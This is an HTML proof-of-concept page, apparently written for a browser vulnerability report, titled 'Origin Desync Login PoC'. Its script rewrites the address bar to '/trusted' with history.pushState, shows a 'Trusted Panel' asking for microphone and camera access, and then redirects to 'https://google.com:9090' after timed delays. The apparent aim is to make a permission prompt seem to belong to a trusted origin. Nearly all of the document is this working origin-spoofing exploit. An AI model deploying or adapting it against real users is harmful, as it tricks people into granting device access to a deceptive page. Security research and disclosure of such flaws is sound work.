<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Origin Desync Login PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
  margin:0;
  font-family:system-ui;
  background:#f5f5f7;
}
button {
  margin:6px;
  font-size:14px;
  padding:8px 12px;
}
#panel {
  display:none;
  max-width:520px;
  margin:60px auto;
  background:#fff;
  padding:24px;
  border-radius:16px;
  box-shadow:0 20px 60px rgba(0,0,0,.2);
}
pre {
  margin-top:12px;
  background:#111;
  color:#0f0;
  padding:10px;
  font-size:11px;
  max-height:260px;
  overflow:auto;
}
.notice {
  margin-top:14px;
  font-size:13px;
  color:#b00020;
}
</style>
</head>

<body>

<div style="text-align:center">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Trusted Panel</h2>

  <button onclick="getMicrophone()">Activate Microphone</button>
  <p id="micOutput">Microphone: -</p>

  <hr>

  <button onclick="openCamera()">Open Camera</button>
  <video id="camera" autoplay playsinline></video>

  <div class="notice">
    Demo only — browser permission required
  </div>
</div>

<script>
const panel = document.getElementById('panel');
const trigger = document.getElementById('trigger');

/* ======================
   MICROPHONE (GANTI LOKASI)
====================== */
function getMicrophone() {
  const out = document.getElementById('micOutput');

  navigator.mediaDevices.getUserMedia({ audio:true })
    .then(stream => {
      out.textContent = "Microphone: ACTIVE";

      const ctx = new AudioContext();
      const src = ctx.createMediaStreamSource(stream);
      src.connect(ctx.destination);
    })
    .catch(() => {
      out.textContent = "Microphone: DENIED";
    });
}

/* ======================
   CAMERA (TETAP)
====================== */
function openCamera() {
  navigator.mediaDevices.getUserMedia({ video:true })
    .then(s => camera.srcObject = s)
    .catch(()=>alert('Camera denied'));
}

/* ======================
   TRUSTED STATE
====================== */
trigger.onclick = () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
};

/* ======================
   PAGE LIFECYCLE REDIRECT
====================== */
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com:9090';
      }, 80);
    });
  });
});
</script>

</body>
</html>
